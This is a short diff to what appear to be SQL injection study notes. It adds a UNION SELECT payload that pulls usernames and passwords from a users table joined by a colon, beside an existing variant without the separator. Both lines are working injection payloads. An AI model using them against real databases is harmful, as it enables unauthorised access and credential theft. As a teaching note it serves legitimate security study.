@@ -19,3 +19,5 @@
 Or we can concatenate both strings like that
 
 ' union select null,username||password from users--
+
+' union select null,username||':'||password from users-- [To differentiate between two strings.]
